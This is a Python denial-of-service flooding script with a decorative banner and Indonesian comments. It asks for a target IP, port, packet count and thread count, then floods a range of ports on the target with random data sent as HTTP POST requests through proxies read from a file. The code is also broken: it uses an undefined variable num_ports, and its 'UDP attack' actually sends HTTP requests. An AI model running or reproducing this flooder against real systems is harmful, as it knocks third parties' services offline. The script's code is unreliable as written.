import random
import threading
import time
import requests

print("""
\033[31m◕▬▬▬▬▬▬▬▬▬◕.❋[❤].❋◕ ▬▬▬▬▬▬▬▬▬◕

\033[32m████░████▄░██░████░██▄░██░████▄░░▄███▄

\033[33m██▄░░██░██░██░██▄░░███▄██░██░▀██░▀█▄▀▀

\033[34m██▀░░████▀░██░██▀░░██▀███░██░▄██░▄▄▀█▄

\033[35m██░░░██░██░██░████░██░░██░████▀░░▀███▀

\033[36m◕▬▬▬▬▬▬▬▬▬◕.❋[❤].❋◕ ▬▬▬▬▬▬▬▬▬◕
""")

print("\033[31m━━━ Want to Ddos? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)

print("\033[31m━━━ IPşęŕvęř")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)

print("\033[31m━━━ Game Port")
game_port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)

print("\033[31m━━━ Pakets")  
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)

print("\033[31m━━━ Threads")
threads = int(input("┗━━━━━━>\033[0m:"))

# Fungsi untuk membaca daftar proxy dari file proxy.txt
def load_proxy_list():
    try:
        with open('proxy.txt', 'r') as file:
            proxies = file.read().splitlines()
        return proxies
    except Exception as e:
        print(f"Error loading proxy list: {e}")
        return []

proxies = load_proxy_list()  # Memuat daftar proxy dari file proxy.txt

# Fungsi serangan UDP dengan multiple ports dan variasi ukuran data
def udp_attack(data_size):
    i = random.choice(("[•]","[+]","[#]"))
    while True:
        try:
            for _ in range(times):
                data = random._urandom(data_size)  # Variasi ukuran data
                for port in range(game_port, game_port + num_ports):  # Menyerang multiple ports
                    url = f"http://{ip}:{port}"
                    proxy = random.choice(proxies) if proxies else None  # Memilih proxy secara acak dari daftar proxy
                    requests.post(url, data=data, proxies={'http': proxy})
                time.sleep(0.1)  # Serangan berdenyut dengan interval 0.1 detik
        except Exception as e:
            print(f"[!] Server Down!!! {e}")

# Pilihan serangan
if choice == 'y':
    # Menggunakan thread untuk serangan UDP
    for _ in range(threads):
        th = threading.Thread(target=udp_attack, args=(2048,))  # Ukuran data yang lebih besar untuk UDP
        th.start()
